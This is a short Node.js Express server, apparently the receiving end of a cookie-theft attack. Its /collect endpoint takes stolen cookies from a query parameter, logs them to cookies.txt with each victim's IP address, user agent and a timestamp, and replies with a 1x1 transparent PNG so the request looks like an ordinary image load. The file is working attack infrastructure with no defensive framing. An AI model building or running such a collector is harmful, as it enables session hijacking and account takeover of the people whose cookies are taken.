const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;
const saveFile = path.join(__dirname, 'cookies.txt');

app.get('/collect', (req, res) => {
    const cookies = req.query.cookies;
    if (cookies !== undefined) {
        const cookies_decoded = decodeURIComponent(cookies);
        const ip = req.ip || req.connection.remoteAddress || 'unknown';
        const ua = req.headers['user-agent'] || 'unknown';
        const time = new Date().toISOString();
        const entry = `[${time}] IP=${ip} UA=${ua.replace(/[\r\n]/g,' ')} COOKIES=${cookies_decoded.replace(/[\r\n]/g,'')} \n`;
        fs.appendFileSync(saveFile, entry, { encoding: 'utf8' });
    }

    const imgBase64 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGNgYAAAAAMAASsJTYQAAAAASUVORK5CYII=';
    const imgBuf = Buffer.from(imgBase64, 'base64');
    res.set('Content-Type', 'image/png');
    res.send(imgBuf);
});

app.listen(PORT, () => console.log(`Collector running on http://localhost:${PORT}/collect`));
